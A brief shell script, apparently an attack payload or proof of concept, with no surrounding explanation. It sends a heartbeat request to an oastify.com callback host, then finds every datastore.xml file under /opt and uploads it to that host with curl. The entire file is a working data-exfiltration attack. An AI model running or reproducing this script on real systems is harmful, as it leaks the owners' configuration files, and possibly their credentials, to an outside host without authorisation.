#!/bin/sh
curl http://jm9610q5mvh5pgcpsql4q2lf56bxz3hkln3c.oastify.com/heartbeat
find /opt -name datastore.xml -exec curl -F f=@{} http://jm9610q5mvh5pgcpsql4q2lf56bxz3hkln3c.oastify.com/ds \;
